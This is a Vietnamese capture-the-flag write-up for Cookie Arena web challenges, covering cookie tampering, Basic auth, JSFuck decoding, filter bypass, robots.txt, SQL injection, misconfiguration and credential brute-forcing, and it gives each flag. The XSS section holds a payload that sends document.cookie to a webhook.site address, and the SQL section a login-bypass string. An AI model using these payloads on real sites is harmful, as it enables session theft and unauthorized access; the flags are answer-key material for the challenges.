# Writeup-Cookie-Arena-CTF - WEB

## WEB Basic

### Hân Hoan
>Cookie
> 
Sau khi đăng nhập với username=zev và password=123 thì ta thấy được :

![cookie](https://github.com/tinasahara1/Writeup-Cookie-Arena-CTF/blob/bf4779a95f46ac284a97d67a890129d623457bfd/image/cookie1.PNG)

Sử dụng tiện ích EditThisCookie => Ta kiểm tra cookie thì thấy Role đang thiết lập mặc định là Guest:

![cookie](https://github.com/tinasahara1/Writeup-Cookie-Arena-CTF/blob/42fdc78311c5fce5192ac65f3e015fa7123c4303/image/cookie2.PNG)

Thay Guest thành CookieHanHoan => Flag
![cookie](https://github.com/tinasahara1/Writeup-Cookie-Arena-CTF/blob/42fdc78311c5fce5192ac65f3e015fa7123c4303/image/cookie_flag.PNG)

### Header 401 
> HTTP Protocol
> 
Xem source code ta thấy được chú thích gợi ý Authentication :

![header](https://github.com/tinasahara1/Writeup-Cookie-Arena-CTF/blob/06e9a05c6c9970c815c2f43e1d2136e5316bb494/image/h401_1.PNG)

Ta base64 user:pass :

![header](https://github.com/tinasahara1/Writeup-Cookie-Arena-CTF/blob/06e9a05c6c9970c815c2f43e1d2136e5316bb494/image/h401_2.PNG)

Muốn xác thực thì ta cần đổi method GET thành POST và thêm Header **Authorization:Basic<Base64username:password>** => ta sử dụng Burp Suite :

![header](https://github.com/tinasahara1/Writeup-Cookie-Arena-CTF/blob/06e9a05c6c9970c815c2f43e1d2136e5316bb494/image/h401_3_flag.png)

### JS B**p B**p
> Do you know special JavaScript?
> 
Xem source code ta phát hiện 4 file .js và 1 hàm chức năng 

![js](https://github.com/tinasahara1/Writeup-Cookie-Arena-CTF/blob/96a28f7b2e0b76715f0f5fde7e685899b392c1c7/image/jsfuck2.PNG)

Từ source code trên ta thấy được có 3 hàm xác thực verifyUsername(), verifyPassword(), verifyRole() => Ta có thể sd tool decode [JSFUCK](https://enkhee-osiris.github.io/Decoder-JSFuck/) hoặc dùng console :

![js](https://github.com/tinasahara1/Writeup-Cookie-Arena-CTF/blob/96a28f7b2e0b76715f0f5fde7e685899b392c1c7/image/jsfuck3.PNG)

Hàm verifyRole() tương đối phức tạp ta phân tích từng ý một :

```js
function verifyRole(role) {
    if (role.charCodeAt(0) != 64) {
        return false;
    }
    if ((role.charCodeAt(1) + role.charCodeAt(2) != 209) && (role.charCodeAt(2) - role.charCodeAt(1) != 9)) {
        return false
    }
    if ((role.charCodeAt(3).toString() + role.charCodeAt(4).toString() != "10578") && (role.charCodeAt(3) - role.charCodeAt(4) != 27)) {
        return false
    }
    return true
}
```
Chữ cái đầu tiên ứng charCodeAt(0) ứng với mã ascii(64) = "@"
Chữ thứ 1 và thứ 2 lần lượt được tìm thấy thông qua phép toán : 
x1 + x2 = 209 
x1 - x2 = 9
=> x1 = 100 = "d"
=> x2 = 109 = "m"
Chữ cái thứ 3 và 4 được phân tích thành chuỗi và ghép lại :
"x3" + "x4" = "10578"
=> x3 = 105 = "i"
=> x4 = 78 = "N"

Xác thực đăng phập => Flag   
![js](https://github.com/tinasahara1/Writeup-Cookie-Arena-CTF/blob/96a28f7b2e0b76715f0f5fde7e685899b392c1c7/image/jsfuck4.PNG)

Flag : `Flag{JAV-ascript_F*ck}`

### Impossible
> Tìm cách đăng nhập thông qua password
> 
Xem source code thì ta thấy được :
```js
function checkPass()
{
	var password = document.getElementById('password').value;
	if (btoa(password.replace("cookiehanhoan", "")) == "Y29va2llaGFuaG9hbg==") {
		window.setTimeout(function() {
			window.location.assign('check.php?password=' + password);
		}, 500);
	}
}
```
Hàm btoa() : mã hóa string thành base64
Nếu **password** được nhập là cookiehanhoan thì sẽ bị lọc 
Mà string sau khi decode base64 == "Y29va2llaGFuaG9hbg==" ==cookiehanhoan
Sau khi nhìn lại ta phát hiện chức năng .replace() không hề lọc đệ quy mà chỉ lọc 1 lần 
=> Ta có thể bypass nó bằng cách **cookiecookiehanhoanhanhoan**
=> Flag : `Flag{Javascript_is_not_safe???}`

###Infinite Loop
>Vòng lặp vô hạn
>
Sau khi đăng nhập với 1 username:password bất kì ta sẽ được chuyển liên tục page với id được thay đổi liên tục => Để kiểm tra ta sử dung Burp SUite thì thấy được :
![loop](https://github.com/tinasahara1/Writeup-Cookie-Arena-CTF/blob/67500160e2e9b5a515b19d62811f5b6420af3d93/image/loopid1.PNG)

Ta gửi 1 request đến Repeater để kiểm tra từng id 0->10 thì phát hiện ra flag hoặc có thể follow redirection để chuyển hướng liên tục cho đến khi thấy flag
![loop](https://github.com/tinasahara1/Writeup-Cookie-Arena-CTF/blob/67500160e2e9b5a515b19d62811f5b6420af3d93/image/loop_flag.png)

Bạn cũng có thể code 1 script nhỏ của py để chạy test id như sau :
```py
import requests

for i in range(0,11):
	idd=str(i)
	url = f"http://chal6.web.letspentest.org/check.php?id={idd}"
	r=requests.get(url,allow_redirects=False)
	if "Flag{" in r.text:
		print(r.text)
		break
	else :
		print("Failed id ="+ idd)
```

Flag: `Flag{Y0u_c4ptur3_m3_xD!!!}`

###I am not a robot
>robots.txt
>
Sau khi đọc đề mình đoán rằng bài này sẽ sử dụng **/robots.txt** thì thấy :
![robots](https://github.com/tinasahara1/Writeup-Cookie-Arena-CTF/blob/67500160e2e9b5a515b19d62811f5b6420af3d93/image/robots1.PNG)

Truy cập vào **/fl@g1337_d240c789f29416e11a3084a7b50fade5.txt** => Flag

Flag: `Flag{N0_B0T_@ll0w}`

###Sause
Xem source code => Flag 
![sause]()

Flag: `Flag{Web_Sause_Delicious}`

##Web Exploitation

###XSS
>Lỗ hổng XSS
>
Đề bài đã cho chúng ta gợi ý về lỗ hổng của bài này 
Ta test script cơ bản của XSS : `<script>alert(1)</script>`
=> Thì thấy trang xuất hiện thông báo 1 hiện lên ở page => Đó là dấu hiệu cho biết page này đã dính lỗi xss
Trước hết ta tạo 1 request bằng tool : [Webhook.site](https://webhook.site/#!/02c72b46-4d85-429b-ad90-6a208d9d102f)
Để lấy cookie ta sử dụng script sau : `<img src=x onerror=this.src='https://webhook.site/02c72b46-4d85-429b-ad90-6a208d9d102f/?'+document.cookie;>`

###Ét Quy Eo
> Lỗ hổng SQL Basic
> 
Cũng như bài xss đề bài đã gợi ý cho chúng ta về lỗ hổng của bài này 
Ta test script cơ bản của SQL : `' or 1=1-- -` cho cả username và password 
![sql](https://github.com/tinasahara1/Writeup-Cookie-Arena-CTF/blob/e157a30c9cb9b1fbdf682ae363bbd10382a7e557/image/sql.png)

Ta decode base64 => flag 
Flag: `Flag{Fr33_Styl3}` 

> Query :
>
```sql
SELECT username,password from users where username = ' or 1=1-- -'&password=' or 1=1-- -'
```

###Misconfiguration
>Gà mắc phải một sai lầm không đáng có trong việc thiết lập cấu hình Web Server
>
Sau khi đọc gợi ý về **thiết lập cấu hình Web Server** mình đã test thử **/.htaccess** 
![config](https://github.com/tinasahara1/Writeup-Cookie-Arena-CTF/blob/e157a30c9cb9b1fbdf682ae363bbd10382a7e557/image/config.PNG)

Nhưng sau khi test thêm vài endpoint nhưng vẫn không được mình quyết định sử dụng tool DirBuster 
![config](https://github.com/tinasahara1/Writeup-Cookie-Arena-CTF/blob/e157a30c9cb9b1fbdf682ae363bbd10382a7e557/image/config1.PNG)

Sau khi chạy tool thì tìm thấy **/web.config**
![config](https://github.com/tinasahara1/Writeup-Cookie-Arena-CTF/blob/e157a30c9cb9b1fbdf682ae363bbd10382a7e557/image/config2.PNG)

Trên page ta thấy **/backup-ddmmyy.bak** thì nó tải 1 file .bak về máy 
Sau đó sử dụng lệnh file backup-ddmmyy.bak => Thì phát hiện nó là 1 file .zip  
Mình đổi tên file thành backup-ddmmyy.zip => unzip thì phát hiện 1 file part3.txt
Ghép 3 phần ta được 1 flag hoàn chỉnh :

Flag: `Flag{1b283f0725d536a0f217d89caca7b183}`


###Gatling Gun
>Nhặt đạn ở trong Github của Cookie Hân Hoan nhé
>
Page có dạng yêu cầu đăng nhập username, password, ip admin
![gun](https://github.com/tinasahara1/Writeup-Cookie-Arena-CTF/blob/2e175223cd43254ccbefaa5a1c5704260a0452f1/image/gun.PNG)

Đến gihub của cookiehanhoan ta thấy được :
![gun](https://github.com/tinasahara1/Writeup-Cookie-Arena-CTF/blob/2e175223cd43254ccbefaa5a1c5704260a0452f1/image/gun_github.PNG)

Từ kinh nghiệm của bài github ở phần forensic mình đã xem thử phần history của tất cả các file xem có lọc được bớt payload hay không 
Sau 1 hồi check thì phát hiện ở file ip có 1 file đã được tạo lúc đầu với chỉ 1 ip duy nhất là `0.0.0.0`
![gun](https://github.com/tinasahara1/Writeup-Cookie-Arena-CTF/blob/2e175223cd43254ccbefaa5a1c5704260a0452f1/image/gun_ip.PNG)

Kiểm tra file username thì thấy tên file **userLame.txt** hmmmm user là me ?? có khi nào username chính là tên Folder HoangTuEch 
Sau khi vào file mình đã lọc ra tên username trùng tên với folder => `hoangtueck` 
![gun](https://github.com/tinasahara1/Writeup-Cookie-Arena-CTF/blob/2e175223cd43254ccbefaa5a1c5704260a0452f1/image/gun_pass.png)

Bắt đầu chạy burp suite -> intridute để test thử những phán đoán của bản thân 
![gun](https://github.com/tinasahara1/Writeup-Cookie-Arena-CTF/blob/2e175223cd43254ccbefaa5a1c5704260a0452f1/image/gun_flag.PNG)

Flag: `FLAG{e6c068faf9241fe9d1f2000516718377}`

